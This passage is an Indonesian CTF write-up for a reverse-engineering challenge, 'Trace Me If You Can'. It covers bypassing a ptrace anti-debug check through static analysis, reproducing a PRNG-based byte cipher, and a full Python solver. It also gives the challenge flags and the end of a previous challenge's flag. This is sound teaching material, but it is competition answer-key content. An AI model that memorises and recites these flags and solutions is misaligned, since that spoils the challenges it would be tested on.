NevComp3.0{shuffl1ng_n1bbl3s_4nd_r0ll1ng_b1ts_l1k3_4_pr0f3ss10n4l_ch3f}
```

Pola: tulis inverse dari kanan ke kiri. XOR, add modulo, nibble swap, dan rotate bukan enkripsi kuat jika key serta ciphertext tertanam.

---

### Trace Me If You Can - Kategori: RE

**Flag:** `NevComp3.0{tr4c3_m3_1f_y0u_c4n_w1th_gdb_ptr4c3}`

#### 1. Pengenalan File (`src` vs `dist`)

Peserta mendapat `Reverse/Trace Me If You Can/dist/chall`. `src/chall.c` memuat checker, `src/enc.py` generator, dan `src/ptrace.c` helper anti-debug. Saat lomba mulai dari `dist/chall`; source internal tidak tersedia.

#### 2. Cara Analisis Awal (Reconnaissance)

```bash
cd 'Reverse/Trace Me If You Can'
file dist/chall
checksec --file=dist/chall
strings -n 6 dist/chall | less
```

Cari `Debugger Detected!`, array cipher 47 byte, seed `0x1337BEEF`, multiplier `0x5bd1e995`, dan increment `0x273cb`. State `13,42,7,88,99` hanya obfuscation alur.

`ptrace(PTRACE_TRACEME,...)` mendeteksi debugger. Lebih aman meniru algoritma offline daripada langsung memakai GDB.

**Tools yang dipakai:**

- `file`: memastikan ELF.
- `strings`: mencari pesan anti-debug dan prompt.
- `checksec`: melihat proteksi binary.
- Ghidra: mengikuti state machine dan mengambil array cipher.
- Python: mereproduksi PRNG dan inverse transform.
- GDB hanya opsional; program memang dirancang untuk mendeteksi debugger.

**Command pengecekan dari awal:**

```bash
cd "/mnt/c/laragon/www/NevComp3.0-main/Reverse/Trace Me If You Can"
file dist/chall
checksec --file=dist/chall
strings -a -n 6 dist/chall | grep -Ei 'debug|correct|wrong|flag|enter'
objdump -d -M intel dist/chall | grep -A30 -B10 ptrace
printf 'test\n' | ./dist/chall
```

Jika output `Debugger Detected!` muncul hanya saat memakai GDB, itu perilaku yang diharapkan. Jalankan normal untuk melihat checker. Jika memakai Ghidra, cari string `Debugger Detected!`, lalu ikuti reference ke constructor `anti_debug`; setelah itu cari array `cipher` dan konstanta PRNG.

#### 3. Konsep Dasar

Setiap byte dibuat dengan:

```text
prng = (prng * 0x5bd1e995 + 0x273cb) mod 2^32
key1 = (prng >> 16) & 0xff
key2 = (prng >> 8) & 0xff
x = flag XOR key1
x = x + key2 mod 256
cipher = ROL(x, 3)
```

Inverse: ROR 3, kurangi `key2`, XOR `key1`. Seed tetap membuat urutan key deterministik.

#### 4. Langkah-demi-Langkah Penyelesaian (Step-by-Step Tutorial)

1. Ekstrak cipher dan panjang 47.
2. Reproduksi update PRNG untuk setiap byte.
3. Ambil `key1` dan `key2`.
4. ROR cipher 3 bit.
5. Kurangi key2 dan XOR key1.
6. Gabungkan bytes, lalu uji ke binary.

#### 5. Full Script Solver & Penjelasan Per Baris

```python
# Simpan script ini sebagai solve_trace.py, lalu jalankan:
# python3 solve_trace.py
cipher = [0x81,0xBA,0x52,0xF8,0x53,0x90,0x76,0x2D,0x78,0x53,
0xD3,0xB6,0x19,0xBD,0x7C,0xF4,0x0F,0xDA,0x22,0x0D,0x91,0x51,
0x9B,0x6D,0x2B,0xD4,0x63,0xE6,0xAB,0xAC,0x10,0xD9,0xC7,0xD0,
0x26,0x7B,0x84,0x86,0x40,0x21,0x0D,0x7F,0x68,0xA7,0xA4,0x20,0x18]

prng = 0x1337BEEF
plain = bytearray()
for encrypted in cipher:
    # & 0xffffffff meniru overflow unsigned int C.
    prng = (prng * 0x5BD1E995 + 0x273CB) & 0xffffffff
    key1 = (prng >> 16) & 0xff
    key2 = (prng >> 8) & 0xff
    value = ((encrypted >> 3) | (encrypted << 5)) & 0xff
    value = (value - key2) & 0xff
    value ^= key1
    plain.append(value)
print(plain.decode())
```

Mask `0xffffffff` dan `0xff` penting karena Python tidak otomatis overflow seperti unsigned C.

#### 6. Flag & Kesimpulan Belajar

```text
NevComp3.0{tr4c3_m3_1f_y0u_c4n_w1th_gdb_ptr4c3}
```

Pola: anti-debug hanya menghalangi observasi, bukan analisis statis. Ringkas state machine, reproduksi PRNG, lalu balikkan operasi byte.

---

## Checklist belajar

1. Scan nama, ukuran, dan format file.
2. Buka `dist`, bukan `src`, saat simulasi lomba.
3. Klasifikasikan dari artefak: prime/cipher = Crypto; ELF+overflow = Pwn; checker binary = RE; PCAP/image = Forensic; HTTP = Web.
4. Jalankan `file`, `strings`, `checksec`, dan program dengan input aman.
5. Cari asumsi lemah sebelum brute force.
6. Tulis solver kecil dan validasi flag ke checker.
7. Catat offset, endian, modulo, versi libc, host, dan port.
